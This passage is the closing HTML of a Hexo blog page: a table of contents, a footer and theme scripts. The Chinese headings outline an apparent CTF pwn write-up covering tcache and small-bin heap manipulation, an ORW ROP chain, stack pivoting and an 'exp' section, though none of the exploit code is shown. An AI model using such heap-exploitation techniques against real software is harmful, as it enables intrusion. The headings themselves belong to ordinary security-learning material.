href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E5%87%BD%E6%95%B0"><span class="toc-number">3.6.</span> <span class="toc-text">栈溢出函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">4.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="toc-number">5.</span> <span class="toc-text">调试过程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0tcache-bin"><span class="toc-number">5.1.</span> <span class="toc-text">构造tcache bin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8unsorted-bin%E6%9E%84%E9%80%A0%E4%B8%A4%E4%B8%AAsmall-bin-chunk"><span class="toc-number">5.2.</span> <span class="toc-text">利用unsorted bin构造两个small bin chunk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9small-bin-chunk%E7%9A%84bk%E6%8C%87%E9%92%88%E4%B8%BAfirst-chunk-0x800"><span class="toc-number">5.3.</span> <span class="toc-text">修改small bin chunk的bk指针为first_chunk+0x800</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0ORW%E7%9A%84ROP%E9%93%BE%E6%94%BE%E5%85%A5%E5%A0%86%E5%9D%97%E4%B8%AD"><span class="toc-number">5.4.</span> <span class="toc-text">构造ORW的ROP链放入堆块中</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="toc-number">5.5.</span> <span class="toc-text">栈迁移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">5.6.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>